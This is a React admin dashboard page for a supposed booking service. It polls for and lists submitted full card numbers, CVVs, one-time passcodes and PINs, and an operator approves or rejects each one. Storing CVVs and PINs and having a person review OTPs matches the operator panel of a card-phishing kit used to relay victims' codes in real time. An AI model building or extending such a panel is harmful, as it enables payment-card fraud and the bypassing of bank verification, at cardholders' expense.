import { useState, useEffect } from "react";
import { Button } from "@/components/ui/button";
import { Card, CardContent, CardDescription, CardHeader, CardTitle } from "@/components/ui/card";
import { Tabs, TabsContent, TabsList, TabsTrigger } from "@/components/ui/tabs";
import { Dialog, DialogContent, DialogDescription, DialogHeader, DialogTitle } from "@/components/ui/dialog";
import { CheckCircle2, XCircle, Clock } from "lucide-react";
import { useAuth } from "@/_core/hooks/useAuth";
import { useLocation } from "wouter";
import { trpc } from "@/lib/trpc";

interface CardDetail {
  id: number;
  email: string;
  cardNumber: string;
  cardHolder: string;
  expiryDate: string;
  cvv: string;
  status: "pending" | "approved" | "rejected";
  createdAt: Date;
}

interface OtpDetail {
  id: number;
  email: string;
  otp: string;
  status: "pending" | "approved" | "rejected";
  createdAt: Date;
}

interface PinDetail {
  id: number;
  email: string;
  pin: string;
  status: "pending" | "approved" | "rejected";
  createdAt: Date;
}

export default function AdminDashboardNew() {
  const { user, isAuthenticated } = useAuth();
  const [, setLocation] = useLocation();
  const [selectedCard, setSelectedCard] = useState<CardDetail | null>(null);
  const [selectedOtp, setSelectedOtp] = useState<OtpDetail | null>(null);
  const [selectedPin, setSelectedPin] = useState<PinDetail | null>(null);
  
  const [cards, setCards] = useState<CardDetail[]>([]);
  const [otps, setOtps] = useState<OtpDetail[]>([]);
  const [pins, setPins] = useState<PinDetail[]>([]);
  
  const [loading, setLoading] = useState(true);

  // Fetch data from API
  useEffect(() => {
    const fetchData = async () => {
      try {
        setLoading(true);
        const [cardsRes, otpsRes, pinsRes] = await Promise.all([
          fetch("/api/trpc/booking.getPendingCardDetails"),
          fetch("/api/trpc/booking.getPendingOtp"),
          fetch("/api/trpc/booking.getPendingPin"),
        ]);

        if (cardsRes.ok) {
          const cardsData = await cardsRes.json();
          setCards(cardsData.result?.data?.data || []);
        }
        if (otpsRes.ok) {
          const otpsData = await otpsRes.json();
          setOtps(otpsData.result?.data?.data || []);
        }
        if (pinsRes.ok) {
          const pinsData = await pinsRes.json();
          setPins(pinsData.result?.data?.data || []);
        }
      } catch (error) {
        console.error("Error fetching data:", error);
      } finally {
        setLoading(false);
      }
    };

    fetchData();
    // Refresh every 5 seconds
    const interval = setInterval(fetchData, 5000);
    return () => clearInterval(interval);
  }, []);

  const handleCardApprove = async (id: number) => {
    try {
      await fetch("/api/trpc/booking.updateCardStatus", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ id, status: "approved" }),
      });
      setCards(cards.filter(c => c.id !== id));
      setSelectedCard(null);
    } catch (error) {
      console.error("Error approving card:", error);
    }
  };

  const handleCardReject = async (id: number) => {
    try {
      await fetch("/api/trpc/booking.updateCardStatus", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ id, status: "rejected" }),
      });
      setCards(cards.filter(c => c.id !== id));
      setSelectedCard(null);
    } catch (error) {
      console.error("Error rejecting card:", error);
    }
  };

  const handleOtpApprove = async (id: number) => {
    try {
      await fetch("/api/trpc/booking.updateOtpStatus", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ id, status: "approved" }),
      });
      setOtps(otps.filter(o => o.id !== id));
      setSelectedOtp(null);
    } catch (error) {
      console.error("Error approving OTP:", error);
    }
  };

  const handleOtpReject = async (id: number) => {
    try {
      await fetch("/api/trpc/booking.updateOtpStatus", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ id, status: "rejected" }),
      });
      setOtps(otps.filter(o => o.id !== id));
      setSelectedOtp(null);
    } catch (error) {
      console.error("Error rejecting OTP:", error);
    }
  };

  const handlePinApprove = async (id: number) => {
    try {
      await fetch("/api/trpc/booking.updatePinStatus", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ id, status: "approved" }),
      });
      setPins(pins.filter(p => p.id !== id));
      setSelectedPin(null);
    } catch (error) {
      console.error("Error approving PIN:", error);
    }
  };

  const handlePinReject = async (id: number) => {
    try {
      await fetch("/api/trpc/booking.updatePinStatus", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ id, status: "rejected" }),
      });
      setPins(pins.filter(p => p.id !== id));
      setSelectedPin(null);
    } catch (error) {
      console.error("Error rejecting PIN:", error);
    }
  };

  if (!isAuthenticated || user?.role !== "admin") {
    return (
      <div className="min-h-screen flex items-center justify-center bg-gray-50">
        <Card className="w-full max-w-md">
          <CardHeader>
            <CardTitle>Access Denied</CardTitle>
            <CardDescription>You don't have permission to access this page.</CardDescription>
          </CardHeader>
          <CardContent>
            <Button onClick={() => setLocation("/")} className="w-full">
              Go Back Home
            </Button>
          </CardContent>
        </Card>
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-gray-50">
      {/* Header */}
      <header className="bg-white shadow">
        <div className="max-w-7xl mx-auto px-4 py-6">
          <h1 className="text-3xl font-bold text-gray-900">Admin Dashboard</h1>
          <p className="text-gray-600 mt-2">Welcome, {user?.name}</p>
        </div>
      </header>

      {/* Main Content */}
      <main className="max-w-7xl mx-auto px-4 py-8">
        {/* Stats Cards */}
        <div className="grid grid-cols-1 md:grid-cols-3 gap-6 mb-8">
          <Card>
            <CardHeader className="flex flex-row items-center justify-between space-y-0 pb-2">
              <CardTitle className="text-sm font-medium">Pending Cards</CardTitle>
              <Clock className="h-4 w-4 text-yellow-600" />
            </CardHeader>
            <CardContent>
              <div className="text-2xl font-bold">{cards.length}</div>
              <p className="text-xs text-muted-foreground">Awaiting approval</p>
            </CardContent>
          </Card>

          <Card>
            <CardHeader className="flex flex-row items-center justify-between space-y-0 pb-2">
              <CardTitle className="text-sm font-medium">Pending OTPs</CardTitle>
              <Clock className="h-4 w-4 text-yellow-600" />
            </CardHeader>
            <CardContent>
              <div className="text-2xl font-bold">{otps.length}</div>
              <p className="text-xs text-muted-foreground">Awaiting approval</p>
            </CardContent>
          </Card>

          <Card>
            <CardHeader className="flex flex-row items-center justify-between space-y-0 pb-2">
              <CardTitle className="text-sm font-medium">Pending PINs</CardTitle>
              <Clock className="h-4 w-4 text-yellow-600" />
            </CardHeader>
            <CardContent>
              <div className="text-2xl font-bold">{pins.length}</div>
              <p className="text-xs text-muted-foreground">Awaiting approval</p>
            </CardContent>
          </Card>
        </div>

        {/* Tabs for different data types */}
        <Tabs defaultValue="cards" className="w-full">
          <TabsList>
            <TabsTrigger value="cards">Card Details ({cards.length})</TabsTrigger>
            <TabsTrigger value="otps">OTP Verification ({otps.length})</TabsTrigger>
            <TabsTrigger value="pins">PIN Verification ({pins.length})</TabsTrigger>
          </TabsList>

          {/* Card Details Tab */}
          <TabsContent value="cards">
            <Card>
              <CardHeader>
                <CardTitle>Pending Card Details</CardTitle>
                <CardDescription>Review and approve/reject card submissions</CardDescription>
              </CardHeader>
              <CardContent>
                {loading ? (
                  <div className="text-center py-8">Loading...</div>
                ) : cards.length === 0 ? (
                  <div className="text-center py-8 text-gray-500">No pending cards</div>
                ) : (
                  <div className="space-y-4">
                    {cards.map((card) => (
                      <div
                        key={card.id}
                        className="border rounded-lg p-4 flex justify-between items-center hover:bg-gray-50 cursor-pointer"
                        onClick={() => setSelectedCard(card)}
                      >
                        <div>
                          <p className="font-semibold">{card.cardHolder}</p>
                          <p className="text-sm text-gray-600">{card.email}</p>
                          <p className="text-sm text-gray-600">Card: ****{card.cardNumber.slice(-4)}</p>
                        </div>
                        <div className="flex gap-2">
                          <Button
                            size="sm"
                            variant="outline"
                            className="text-green-600 hover:text-green-700"
                            onClick={(e) => {
                              e.stopPropagation();
                              handleCardApprove(card.id);
                            }}
                          >
                            <CheckCircle2 className="w-4 h-4 mr-1" />
                            Approve
                          </Button>
                          <Button
                            size="sm"
                            variant="outline"
                            className="text-red-600 hover:text-red-700"
                            onClick={(e) => {
                              e.stopPropagation();
                              handleCardReject(card.id);
                            }}
                          >
                            <XCircle className="w-4 h-4 mr-1" />
                            Reject
                          </Button>
                        </div>
                      </div>
                    ))}
                  </div>
                )}
              </CardContent>
            </Card>
          </TabsContent>

          {/* OTP Details Tab */}
          <TabsContent value="otps">
            <Card>
              <CardHeader>
                <CardTitle>Pending OTP Verification</CardTitle>
                <CardDescription>Review and approve/reject OTP submissions</CardDescription>
              </CardHeader>
              <CardContent>
                {loading ? (
                  <div className="text-center py-8">Loading...</div>
                ) : otps.length === 0 ? (
                  <div className="text-center py-8 text-gray-500">No pending OTPs</div>
                ) : (
                  <div className="space-y-4">
                    {otps.map((otp) => (
                      <div
                        key={otp.id}
                        className="border rounded-lg p-4 flex justify-between items-center hover:bg-gray-50 cursor-pointer"
                        onClick={() => setSelectedOtp(otp)}
                      >
                        <div>
                          <p className="font-semibold">OTP: {otp.otp}</p>
                          <p className="text-sm text-gray-600">{otp.email}</p>
                          <p className="text-xs text-gray-500">
                            {new Date(otp.createdAt).toLocaleString()}
                          </p>
                        </div>
                        <div className="flex gap-2">
                          <Button
                            size="sm"
                            variant="outline"
                            className="text-green-600 hover:text-green-700"
                            onClick={(e) => {
                              e.stopPropagation();
                              handleOtpApprove(otp.id);
                            }}
                          >
                            <CheckCircle2 className="w-4 h-4 mr-1" />
                            Approve
                          </Button>
                          <Button
                            size="sm"
                            variant="outline"
                            className="text-red-600 hover:text-red-700"
                            onClick={(e) => {
                              e.stopPropagation();
                              handleOtpReject(otp.id);
                            }}
                          >
                            <XCircle className="w-4 h-4 mr-1" />
                            Reject
                          </Button>
                        </div>
                      </div>
                    ))}
                  </div>
                )}
              </CardContent>
            </Card>
          </TabsContent>

          {/* PIN Details Tab */}
          <TabsContent value="pins">
            <Card>
              <CardHeader>
                <CardTitle>Pending PIN Verification</CardTitle>
                <CardDescription>Review and approve/reject PIN submissions</CardDescription>
              </CardHeader>
              <CardContent>
                {loading ? (
                  <div className="text-center py-8">Loading...</div>
                ) : pins.length === 0 ? (
                  <div className="text-center py-8 text-gray-500">No pending PINs</div>
                ) : (
                  <div className="space-y-4">
                    {pins.map((pin) => (
                      <div
                        key={pin.id}
                        className="border rounded-lg p-4 flex justify-between items-center hover:bg-gray-50 cursor-pointer"
                        onClick={() => setSelectedPin(pin)}
                      >
                        <div>
                          <p className="font-semibold">PIN: ••••</p>
                          <p className="text-sm text-gray-600">{pin.email}</p>
                          <p className="text-xs text-gray-500">
                            {new Date(pin.createdAt).toLocaleString()}
                          </p>
                        </div>
                        <div className="flex gap-2">
                          <Button
                            size="sm"
                            variant="outline"
                            className="text-green-600 hover:text-green-700"
                            onClick={(e) => {
                              e.stopPropagation();
                              handlePinApprove(pin.id);
                            }}
                          >
                            <CheckCircle2 className="w-4 h-4 mr-1" />
                            Approve
                          </Button>
                          <Button
                            size="sm"
                            variant="outline"
                            className="text-red-600 hover:text-red-700"
                            onClick={(e) => {
                              e.stopPropagation();
                              handlePinReject(pin.id);
                            }}
                          >
                            <XCircle className="w-4 h-4 mr-1" />
                            Reject
                          </Button>
                        </div>
                      </div>
                    ))}
                  </div>
                )}
              </CardContent>
            </Card>
          </TabsContent>
        </Tabs>
      </main>
    </div>
  );
}
